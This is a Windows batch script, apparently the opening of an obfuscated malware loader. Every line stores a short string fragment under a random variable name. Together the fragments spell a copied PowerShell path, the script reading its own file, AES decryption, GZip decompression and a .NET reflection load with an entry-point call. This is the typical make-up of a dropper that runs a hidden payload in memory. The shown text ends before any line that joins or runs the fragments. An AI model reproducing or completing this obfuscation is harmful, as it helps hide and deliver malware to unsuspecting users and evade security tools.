@echo off
set "EHshpnKyHm=xe"
set "DYkMpkXCLy=s\"
set "ffNlLIhaLm=Po"
set "mAWcxpOGDZ=:\"
set "QzGTaqTQNV=we"
set "EQzhowRSnS=rS"
set "GGJwqAsMrL=ll"
set "RpMSIuJQzL=1."
set "CSOVANHuIc=do"
set "MRsKIiMJkT=in"
set "PxhwwSnSlK=y "
set "DrOhNxeDjS=he"
set "XqaAxPEvVd=ws"
set "QXnroqmXwy=em"
set "eqpVXBQUwy=.e"
set "GJoycXgdRO=0\"
set "QBnGfSSFjA=rs"
set "pxKMJxcwRA=nd"
set "CgemypGFWp=\v"
set "zzLtuygigK=32"
set "nsOcBdygka=st"
set "kfvKucKfbS=Wi"
set "deACqwmBIy=po"
set "gZazjPQkta=Sy"
set "ihiaUhduyM=ll"
set "DbtRwlkhkl=\W"
set "MxXniLmxqJ=we"
set "qtngAQfcsy= C"
set "yhHpAulMSJ=ow"
set "BJoCNJtmLX= /"
set "UiPqZsFNLA=py"
set "iDOimNOkBl=he"
set "QqCrrDjZOM=co"
set "sPWCzQRVsP=cd"
set "bdXzwDJJHz= %~dp0"
set "IVhYbZcPwA=]::C"
set "lBfjOxvQUw=$rBd"
set "gKnXISJbjO=eam("
set "LiWbCUfxGQ=pher"
set "nJfXadXlPl=[Sys"
set "dyZteKBPPP=gnir"
set "sENokpFmgK=oArr"
set "pejAKjMMfO=sion"
set "hBHpjAssNF=;$yW"
set "ONMFjYgaNs=ert]"
set "EBjPMVOxWL=DLvK"
set "JYXnGcZgLJ=pose"
set "kVJkauvXBj=ne);"
set "HZNnxVyEEX=;$rB"
set "OFxktVblhA=rYUD"
set "anasgLsJIM=$GrY"
set "MTNHrkYYlD=lit("
set "KPGQASIbKs=-4] "
set "odeLskQfgQ=grap"
set "sQSMVrTgDr=hy.A"
set "QOmeUhcZDY=V = "
set "KhzehjlHQL=tion"
set "jBtoIBDFJt=null"
set "CnhDeOgWAA=ct S"
set "OzvBWcEMOM= = $"
set "GOxUaTtgby=THxh"
set "yvJbSiLWME=ew-O"
set "TbHjQQvyjA=($Qr"
set "RUZJBZIPEM=rofi"
set "ZOTIZdjBoD=('%*'"
set "HvcWirYIgx=('ev"
set "VFaWBnPFMT=$GrY"
set "UxyHkmqxeS=.GZi"
set "mRruUWvKFO=]::N"
set "NtmEffdUdG=Star"
set "uCZhOfUmhZ=ress"
set "anzTOWRnUy=ddin"
set "yNcJInxdlL=kAvb"
set "KtTVoJailw=[-1."
set "ZQuPPuFtil=);$v"
set "PFtWwIvNfy='gni"
set "ZDAFPhzLZh=yWjc"
set "sMcegeDZhx=)($K"
set "ACBcIgyrxz=Obje"
set "gEBxjJRibC=UD);"
set "nDcCWkQDYv=('%~f0'"
set "FnIhXCgFLh=raph"
set "HZpCjfInzp=-1.."
set "PWKKwCtRMM=oint"
set "NZZWLfrduw=dDs "
set "OFqkTOvAgo=se()"
set "iMSdwVyrJW=$yWj"
set "RUdykGxpeK=]::("
set "qxPSZxRwoa=; };"
set "pdZLnaUthM=.Cry"
set "blWajSxFuO=m.Re"
set "bEYAIFmwIY= [Sy"
set "idWIywymgM=d;$v"
